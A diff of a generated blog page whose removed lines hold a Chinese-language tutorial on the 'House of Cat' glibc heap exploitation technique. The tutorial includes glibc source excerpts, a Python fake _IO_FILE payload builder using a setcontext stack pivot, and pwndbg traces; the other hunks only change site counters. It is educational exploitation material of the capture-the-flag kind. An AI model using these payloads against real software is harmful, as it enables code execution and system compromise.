-          <h2 id="House-Of-Cat"><a href="#House-Of-Cat" class="headerlink" title="House Of Cat"></a>House Of Cat</h2><p>House of emma 是 glibc-2.34 下常用的攻击手法之一，其利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大，但是需要攻击位于 TLS 的 <code>_pointer_chk_guard</code>，并且远程可能需要爆破 TLS 偏移</p>
-<p>House of cat 使用了一种新的 IO 链，目前适用于任何版本（包括 glibc-2.35） </p>
-<hr>
-<h2 id="House-Of-Cat-原理"><a href="#House-Of-Cat-原理" class="headerlink" title="House Of Cat 原理"></a>House Of Cat 原理</h2><p>在 libc-2.34 版本中，常用的 hook 都被 ban 掉了（malloc_hook，free_hook 等），我们要尝试通过控制 IO 来获取 shell</p>
-<p>House of cat 利用了 House of emma 的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过 TLS 上 <code>_pointer_chk_guard</code> 的检测相关的IO函数的调用，转而调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_seekoff</code> 函数，然后进入到 <code>_IO_switch_to_wget_mode</code> 函数中来攻击</p>
-<p>应用场景是：</p>
-<ul>
-<li>能够任意写一个可控地址</li>
-<li>能够泄露堆地址和 libc 基址</li>
-<li>能够触发 IO 流（FSOP 或触发 <code>__malloc_assert</code>），执行 IO 相关函数</li>
-</ul>
-<p>我们跟进 <code>_IO_wfile_seekoff</code> ：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">off64_t</span> result;</span><br><span class="line">  <span class="keyword">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">      <span class="comment">/* 在此处调用_IO_switch_to_wget_mode */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>
-<p>核心调用函数 <code>_IO_switch_to_wget_mode</code> 如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">        <span class="comment">/* 这里会调用_IO_WOVERFLOW,而fp可以被我们控制 */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>由于 FP_err 可以被我们控制，所以可以利用宏函数 <code>_IO_WOVERFLOW</code> 完成任意代码执行</li>
-</ul>
-<h2 id="House-Of-Cat-利用姿势"><a href="#House-Of-Cat-利用姿势" class="headerlink" title="House Of Cat 利用姿势"></a>House Of Cat 利用姿势</h2><p>利用 largebin attack 劫持 <code>stderr</code> 控制为已知 heap 地址，伪造 FILE 结构体，然后使 top chunk 不足以申请从而调用 <code>sysmalloc</code></p>
-<p>其中在 <code>stderr</code> 中的 fake_IO_FILE 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0xffff</span>)  <span class="comment"># rax1 </span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)  <span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)  <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得我们可以在一定的范围内对 vtable 表的起始位置进行偏移，使其我们可以通过偏移来调用在 vtable 表中的任意函数</li>
-<li>这里对 vtable 进行偏移，使其可以调用 <code>_IO_wfile_seekoff</code> 函数</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_FILE_plus*)<span class="number">0x55e88c680b00</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x421</span> &lt;error: Cannot access memory at address <span class="number">0x421</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0xffff</span> &lt;error: Cannot access memory at address <span class="number">0xffff</span>&gt;,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x55e88c680bb0</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x7fb0ed36ca6d</span> &lt;setcontext+<span class="number">61</span>&gt; <span class="string">&quot;H\213\242\240&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">0</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x55e88c680200</span>,</span><br><span class="line">    _offset = <span class="number">0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x55e88c680b30</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">0</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7fb0ed52f0d0</span> &lt;_IO_wfile_jumps+<span class="number">16</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来我们来跟进一下 House Of Cat 的触发流程：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__fxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt;  _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d17d0</span> &lt;_IO_wfile_seekoff&gt;       endbr64 </span><br><span class="line">  <span class="number">0x7fa0ae8d17d4</span> &lt;_IO_wfile_seekoff+<span class="number">4</span>&gt;     push   r15</span><br><span class="line">  <span class="number">0x7fa0ae8d17d6</span> &lt;_IO_wfile_seekoff+<span class="number">6</span>&gt;     mov    r15, rdi</span><br><span class="line">  <span class="number">0x7fa0ae8d17d9</span> &lt;_IO_wfile_seekoff+<span class="number">9</span>&gt;     push   r14</span><br><span class="line">  <span class="number">0x7fa0ae8d17db</span> &lt;_IO_wfile_seekoff+<span class="number">11</span>&gt;    push   r13</span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入 <code>_IO_wfile_seekoff</code>，然后调用 <code>_IO_switch_to_wget_mode</code>： </li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d1838</span> &lt;_IO_wfile_seekoff+<span class="number">104</span>&gt;    call   _IO_switch_to_wget_mode                &lt;_IO_switch_to_wget_mode&gt;</span><br><span class="line">       rdi: <span class="number">0x5618e47bbb00</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7fa0aea2a208</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x5618e47bbbb0</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>在这里会 <code>call [rax+0x18]</code> 而 <code>rax</code> 是我们可以控制的（就是 <code>FILE-&gt;_IO_buf_end</code>，是我们人为伪造的）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x5620ac902b40</span> ◂— <span class="number">0xffff</span></span><br><span class="line">*RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x5620ac902bb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x7f6ef7dc9d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把这里修改为 <code>setcontext+61</code> 进行栈迁移（<code>rdx</code> 也是可以控制的）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5620ac902b40</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5620ac902b58</span> —▸ <span class="number">0x7f6ef7d99a6d</span> (setcontext+<span class="number">61</span>) ◂— mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5620ac902b60</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5620ac902b88</span> —▸ <span class="number">0x5620ac902200</span> ◂— <span class="number">0x200000001</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5620ac902b90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>最后利用 House Of Kiwi 中的方式 get shell</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2423,7 +2575,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">138</span>
+          <span class="site-state-item-count">139</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2436,7 +2588,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">99</span>
+        <span class="site-state-item-count">100</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2477,7 +2629,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">27:14</span>
+    <span title="Reading time total">27:28</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
